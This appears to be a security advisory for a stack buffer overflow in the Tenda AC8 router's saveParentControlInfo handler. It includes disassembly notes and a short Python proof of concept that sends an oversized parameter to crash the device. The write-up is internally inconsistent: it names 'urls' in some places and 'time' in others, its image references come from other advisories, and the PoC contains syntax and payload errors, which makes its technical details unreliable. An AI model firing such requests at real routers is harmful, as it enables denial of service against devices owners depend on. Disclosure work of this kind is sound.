# TARGET

- **Device:** Tenda AC8
- **Firmware Version:** V16.03.33.05
- **Vendor Website:** https://www.tendacn.com/
- **Firmware Reference:** AC8v4.0 Firmware - Tenda Global (English)
- ![image-20260202092533671](fastsettingwifiset-timezome.assets/image-20260202092533671.png)

------

# BUG TYPE

This issue is classified as a **Stack-Based Buffer Overflow Vulnerability**, caused by improper input validation in the router’s HTTP service interface.

# Abstract

A buffer overflow vulnerability exists in the **Tenda AC8 router** running firmware version **V16.03.33.05**.
 The flaw originates from the `saveParentControlInfo` interface in the embedded `httpd` service, which fails to properly validate user-supplied input in the `urls` parameter.

An attacker can exploit this vulnerability by sending a specially crafted HTTP request with an overly long `urls` value, potentially leading to  a denial-of-service condition.

------

# Details

## Vulnerability Description

The Tenda AC8 router contains a buffer overflow vulnerability in firmware version **V16.03.33.05**.
 The issue lies in the `saveParentControlInfo` endpoint, where the `httpd` service does not effectively filter or validate the length of the `time` parameter.

Because input data is not correctly checked, a remote attacker can trigger memory corruption by supplying an excessively long string. This may result in arbitrary code execution or cause the device to crash.

------

## Vulnerability Analysis

Using IDA Pro, the vulnerability can be observed in the `httpd` binary, within the function `saveParentControlInfo`.

![image-20260202113410336](saveParentControlInfo-urls.assets/image-20260202113410336.png)



A vulnerability was identified in the function `get_parentControl_list_Info`, which is invoked at line` 32` of the program. The function entry point was located at address `00488B28` during reverse engineering analysis.

![image-20260202113545152](saveParentControlInfo-urls.assets/image-20260202113545152.png)

Further inspection revealed that this function performs unsafe string parsing and copying operations, introducing a potential stack-based buffer overflow condition.

**User-Controlled Input Retrieval**

- The `urls` parameter is entirely **user-controlled**

- No effective validation is applied to its length or content

- This allows an attacker to supply arbitrarily long input values

**Unsafe Parsing with `strcpy`**

The vulnerable code uses `strcpy` to parse the input:

```
strcpy((char *)(a2 + 80), v9);
```

As a result, any input exceeding the buffer capacity will cause `strcpy` to write beyond the intended memory boundaries.

# POC

The following proof-of-concept demonstrates how the vulnerability can be triggered:

```
import requests
url = "http://10.10.10.1/goform/ saveParentControlInfo"
data = {
        b"deviceIDtime":b'a',
        b"urls":123*1024,
        b"ssid":b'12345'
        b'time':b'00:10:00'
    	}
res = requests.post(url=url,data=data)
print(res.content)
```

## Expected Result

Running the exploit produces a **Segmentation Fault**, indicating that the program attempted to access an invalid memory address. This confirms the presence of a serious memory safety issue.

![image-20260202092900925](saveParentControlInfo-time.assets/image-20260202092900925.png)

